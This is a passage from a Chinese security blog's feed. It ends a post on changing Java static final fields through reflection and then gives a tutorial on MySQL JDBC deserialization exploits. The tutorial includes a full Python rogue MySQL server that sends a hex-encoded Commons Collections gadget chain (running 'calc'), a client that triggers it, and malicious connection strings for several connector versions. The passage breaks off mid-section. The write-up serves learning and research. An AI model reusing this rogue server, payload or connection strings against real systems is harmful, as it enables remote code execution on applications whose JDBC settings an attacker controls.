Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//高版本反射同时修改static和final修饰的变量</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getDeclaredFields0</span> <span class="hljs-operator">=</span> Class.class.getDeclaredMethod(<span class="hljs-string">&quot;getDeclaredFields0&quot;</span>, <span class="hljs-type">boolean</span>.class);<br>        getDeclaredFields0.setAccessible(<span class="hljs-literal">true</span>);<br>        Field[] fields = (Field[]) getDeclaredFields0.invoke(Field.class, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">for</span> (Field each : fields) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;modifiers&quot;</span>.equals(each.getName())) &#123;<br>                modifiers = each;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        System.out.println(test1.name1);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们运行的时候还需要添加模块，因为java12的高版本是模块化的，在vm-options添加修改即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;低版本修改final和static&quot;&gt;&lt;a href=&quot;#低版本修改final和static&quot; class=&quot;headerlink&quot; title=&quot;低版本修改final和static&quot;&gt;&lt;/a&gt;低版本修改final和static&lt;/h1&gt;&lt;p&gt;参考文章：&lt;a hr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="基础" scheme="https://clowsman.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Mysql-JDBC反序列化</title>
    <link href="https://clowsman.github.io/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-09-24T15:07:50.000Z</published>
    <updated>2024-10-15T12:48:26.759Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下常见的JDBC反序列化，是MYSQL的，参考文章：<a href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p><h1 id="jdbc简单介绍"><a href="#JDBC简单介绍" class="headerlink" title="JDBC简单介绍"></a>JDBC简单介绍</h1><p>一个简单的查询demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//加载驱动</span><br>        Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>        <span class="hljs-comment">//建立连接,可能要设置一下时区，可以设置为上海</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root123&quot;</span>);<br>        <span class="hljs-comment">//操作数据库执行增删改查</span><br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br>        <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(<span class="hljs-string">&quot;select * from ceshi&quot;</span>);<br>        <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>            System.out.println(resultSet.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。<br>通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被ObjectInputStream.readObject()进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞。<br>可被利用的两条查询语句：</p><ul><li><p>SHOW SESSION STATUS</p><p>此语句用于显示当前会话的状态信息。它提供了一系列关于会话级别的统计信息和变量的值，这些信息可以帮助开发者和数据库管理员了解当前会话的性能和行为。</p></li><li><p>SHOW COLLATION</p><p>此语句用于显示当前数据库中可用的字符集和排序规则（collation）。排序规则定义了如何比较和排序字符串。</p></li></ul><h1 id="serverstatusdiffinterceptor利用链"><a href="#ServerStatusDiffInterceptor利用链" class="headerlink" title="ServerStatusDiffInterceptor利用链"></a>ServerStatusDiffInterceptor利用链</h1><p>参考文章：<a href="https://xz.aliyun.com/t/8159?time__1311=n4+xnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD">https://xz.aliyun.com/t/8159?time__1311=n4%2BxnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD</a></p><p>这里的环境如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>cc是为了用来触发反序列化的</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>首先我们的任务就是找包内有哪个类的方法里面有readObject函数，链子的作者在挖掘的时候就找到了这个入口点<strong>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</strong></p><p><img src="https://cdn.clown2024.cn/202410011740099.png" alt="image-20241001173957942"></p><p>这里就存在readObject方法，那就需要像正常找链子一样往上找了</p><blockquote><p>这里只要我们在jdbc url中设置autoDeserialize为true就可以进入到readObject里面</p><p>-84和-19是序列化对象的前两个字节，用来标识数据是否为序列化对象</p></blockquote><p><img src="https://cdn.clown2024.cn/202410012303198.png" alt="image-20241001230233251"></p><p>这里可以找到ResultSetUtil这个类的resultSetToMap</p><p>然后再继续往上找</p><p><img src="https://cdn.clown2024.cn/202410012304030.png" alt="image-20241001230435900"></p><p>最终就找到了我们的<strong>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</strong>方法，这里执行了我们的前面提到过的<strong>SHOW SESSION STATUS</strong>语句，然后将返回的结果传入resultSetToMap方法来调用</p><p>该类是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法，这两个方法里面都调用了populateMapWithSessionStatusValues方法</p><p><img src="https://cdn.clown2024.cn/202410012317524.png" alt="image-20241001231725481"></p><p>这样就构成了我们的触发条件了</p><p>那我们的攻击思路就是，要让<strong>SHOW SESSION STATUS</strong>返回的结果是一个恶意的序列化对象，我们就需要根据MySql协议的流量格式去写一个恶意的MySql服务器让客户端连接</p><p>我们可以起一个mysql的docekr容器然后去抓一下流量来分析</p><p><img src="https://cdn.clown2024.cn/202410012324338.png" alt="image-20241001232453239"></p><p>就用前面简单的例子执行一下抓一下过程即可，如上图</p><blockquote><p>抓本地回环包需要下载npcap才行</p></blockquote><p>比如Response OK</p><p><img src="https://cdn.clown2024.cn/202410012329473.png" alt="image-20241001232901372"></p><p>我们只需要返回这些数据即可</p><p>我们的攻击过程就是照抄流量包，按照返回的顺序返回给客户端即可，我们可以执行一条SHOW SESSION STATUS的查询跟着伪造一下</p><p>然后copy一下文章有关结果集数据包的结构</p><p><img src="https://cdn.clown2024.cn/202410012333975.png" alt="image-20241001233303908"></p><ul><li>数据段1：说明下面的结果集有多少列</li><li>数据段2：列的定义</li><li>数据段3： EOF 包</li><li>数据段4：行数据。</li></ul><h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><p>这里就直接copy师傅的poc了，读一读代码学习一下</p><p>恶意mysql服务</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment">#问候消息</span><br>greeting_data=<span class="hljs-string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="hljs-comment">#响应消息</span><br>response_ok_data=<span class="hljs-string">&quot;0700000200000002000000&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_data</span>(<span class="hljs-params">conn</span>):<br>    data = conn.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_data</span>(<span class="hljs-params">conn,data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    conn.send(binascii.a2b_hex(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload_content</span>():<br>    <span class="hljs-comment">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &gt; a</span><br>    file= <span class="hljs-string">r&#x27;a&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            payload_content = <span class="hljs-built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open successs&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open false&quot;</span>)<br>        <span class="hljs-comment">#calc</span><br>        payload_content=<span class="hljs-string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span><br>    <span class="hljs-keyword">return</span> payload_content<br><br><span class="hljs-comment"># 主要逻辑</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        conn, addr = sk.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>],addr[<span class="hljs-number">1</span>]))<br><br>        <span class="hljs-comment"># 1.先发送第一个 问候报文</span><br>        send_data(conn,greeting_data)<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span><br>            receive_data(conn)<br>            send_data(conn,response_ok_data)<br><br>            <span class="hljs-comment">#其他过程</span><br>            data=receive_data(conn)<br>            <span class="hljs-comment">#查询一些配置信息,其中会发送自己的 版本号</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload=<span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span><br>                send_data(conn,_payload)<br>                data=receive_data(conn)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                mysql_data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                <span class="hljs-comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span><br>                <span class="hljs-comment">#获取payload</span><br>                payload_content=get_payload_content()<br>                <span class="hljs-comment">#计算payload长度</span><br>                payload_length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                payload_length_hex = payload_length[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + payload_length[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                <span class="hljs-comment">#计算数据包长度</span><br>                data_len = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                data_len_hex = data_len[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + data_len[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + data_len[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                mysql_data += data_len_hex + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;fbfc&#x27;</span>+ payload_length_hex<br>                mysql_data += <span class="hljs-built_in">str</span>(payload_content)<br>                mysql_data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                send_data(conn, mysql_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                send_data(conn, payload)<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    HOST =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    PORT = <span class="hljs-number">3309</span><br><br>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <span class="hljs-comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span><br>    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sk.bind((HOST, PORT))<br>    sk.listen(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST,PORT))<br><br>    run()<br></code></pre></td></tr></table></figure><p>Client</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ServerStatusDiffInterceptor;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">DB_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>;<span class="hljs-comment">//8.x使用</span><br>        Class.forName(driver);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(DB_URL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后生成一个cc7的payload文件放在poc的目录下</p><blockquote><p>卧槽这有个奇怪的坑，ysoserial生成payload的时候命令不能用引号括起来，不然就报错了，反正我是这样的（应该是不能单引号，双引号是可以的</p></blockquote><p>执行效果</p><p><img src="https://cdn.clown2024.cn/202410012339938.png" alt="image-20241001233903839"></p><p><img src="https://cdn.clown2024.cn/202410012339163.png" alt="image-20241001233926085"></p><p>然后8.0.20之后不再调用resultSetToMap方法，也就是不再调用getObject方法了，所以这条链也就打不通了</p><h2 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h2><p>参考文章：<a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p>先说一下由于版本不同带来的改变</p><ol><li>从6.0开始主要使用的包名从·<code>com.mysql</code>变为了<code>com.mysql.cj</code>,所以<code>ServerStatusDiffInterceptor</code>所在位置也有所改变。</li><li>5.1.11-6.0.6使用的interceptors属性为statementInterceptors，8.0以上使用的为queryInterceptors。</li><li>5.1.11以下，无法直接通过连接触发：在执行getConnection时，会执行到com.mysql.jdbc.ConnectionImpl中</li></ol><p>各版本最后都是需要到getObject方法里面去进行反序列化</p><h3 id="510-5110"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><p>连接之后需要执行查询</p><h3 id="5111-5xxx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h3 id="6x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h1 id="detectcustomcollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h1><h2 id="各版本连接串"><a href="#各版本连接串" class="headerlink" title="各版本连接串"></a>各版本连接串</h2><p>先给出各版本的连接串</p><ul><li>5.1.19-5.1.28：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.48：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.49：不可用</li><li>6.0.2-6.0.6：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>8.x.x ：不可用</li></ul><p>该链子反序列化的点也是在resultSetToMap()方法里面</p><p>payload的不同主要在于有些版本会对detectCustomCollations参数进行校验之后才会到反序列化点里面去。</p><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="5119-5140"><a href="#5-1-19-5-1-40" class="headerlink" title="5.1.19-5.1.40"></a>5.1.19-5.1.40</h3><p>这里的利用利用链比较简单，在getConnection的时候会调用到**com.mysql.jdbc.ConnectionImpl#buildCollationMapping()**方法</p><p><img src="https://cdn.clown2024.cn/202410030920363.png" alt="image-20241003092042235"></p><p>这里执行了SHOW COLLATION查询语句，然后调用了resultSetToMap</p><h3 id="5141-5148"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><p>该版本的buildCollationMapping()方法不再调用resultSetToMap方法，但是直接调用了getObject方法，所以payload也没变化</p><p><img src="https://cdn.clown2024.cn/202410030924201.png" alt="image-20241003092445101"></p><h3 id="5149"><a href="#5-1-49" class="headerlink" title="5.1.49"></a>5.1.49</h3><p>该版本就不再调用getObject方法，所以链子也就不可用了</p><h3 id="602-606"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><p>该版本resultSetToMap又回来了</p><p><img src="https://cdn.clown2024.cn/202410030933152.png" alt="image-20241003093358073"></p><h3 